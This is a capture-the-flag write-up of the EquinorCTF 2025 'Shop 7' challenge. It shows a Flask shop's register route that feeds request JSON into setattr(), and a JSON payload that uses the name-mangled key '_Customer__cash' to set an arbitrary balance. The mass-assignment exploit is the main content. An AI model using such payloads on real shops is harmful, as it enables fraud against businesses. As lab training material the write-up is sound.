# Shop 7 - EquinorCTF 2025

### ===== Challenge =====

- What is an arcade without a retro merch store? We ditched all those fancy new JavaScript frameworks from last year and simply went back to our roots like the good old days! Our shop this year boasts a unique, one of a kind pair of EPT socks that you can claim physically at the admin booth after you have bought the socks in the shop and submitted the flag on the platform!

### ===== Analysis =====

- We are presented with a shopping page in which you can buy a Dummy Flag and a pair of EPT socks:

![](./Shop-7_page.png)


- As soon as I saw that you can get them in real life I was **LOCKED IN**
- I started reading through the source code and didn't find anything that I could exploit. However, I noticed that the user registration looked kinda weird:
``` python
@app.route("/register", methods=["POST"])
def register():
	data = request.json
	customer = Customer()
	for key, value in data.items():
		setattr(customer, key, value)
	shop_manager.add_customer(customer)
	response = redirect("/")
	response.set_cookie("token", customer.get_token())
	return response
```

``` python
class Customer:
	id: str
	name: str
	password: str
	__token: str
	__cash: int = 137
```
- I realized that the **attributes** of the new Customer were being **passed into setattr() without any verification**, meaning we are witnessing a **mass assignment** vulnerability. I can just change the **__cash** attribute to how much money I want my customer to have!


``` http
POST /register HTTP/2
Host: synapseburnout-37916fcc-shop-7.ept.gg
Cookie: token=
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://synapseburnout-37916fcc-shop-7.ept.gg/
Content-Type: application/json
Content-Length: 69
Origin: https://synapseburnout-37916fcc-shop-7.ept.gg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{   
    "name":"varanda4",
    "password":"pass",  
    "__cash": 2000
}
```
![](./Shop-7_fail.png) 

- It didn't work ;(

- But I couldn't give up on the socks! 

- I googled the double underscore prefix and learned about **Python Name Mangling**. Basically, it's functionality that makes it harder to unintentionally access the attributes of a parent class.

### ===== Exploitation =====

- The exploit:
	- In this case __cash is mangled into **_Customer__cash**.
	- So by sending `"_Customer__cash":9999999` in the /register request we are able to call **setattr(customer, _Customer__cash, 999999)**, overwriting the cash default amount.

- Let's send the request:
``` json
{
"name":"varanda3",
"password":"pass",
"_Customer__cash": 999999
}
```
- Our user is created and we have enough cash to buy the socks! 

![](./Shop-7_flag.png) 
![](./Shop-7_socks.jpeg) 

- **Flag: EPT{I_gu3s5_n07_s0_pr1v4t3_4f7er_41}**

team: *synapse_burnout*
writeup by *varanda* - 09/11/2025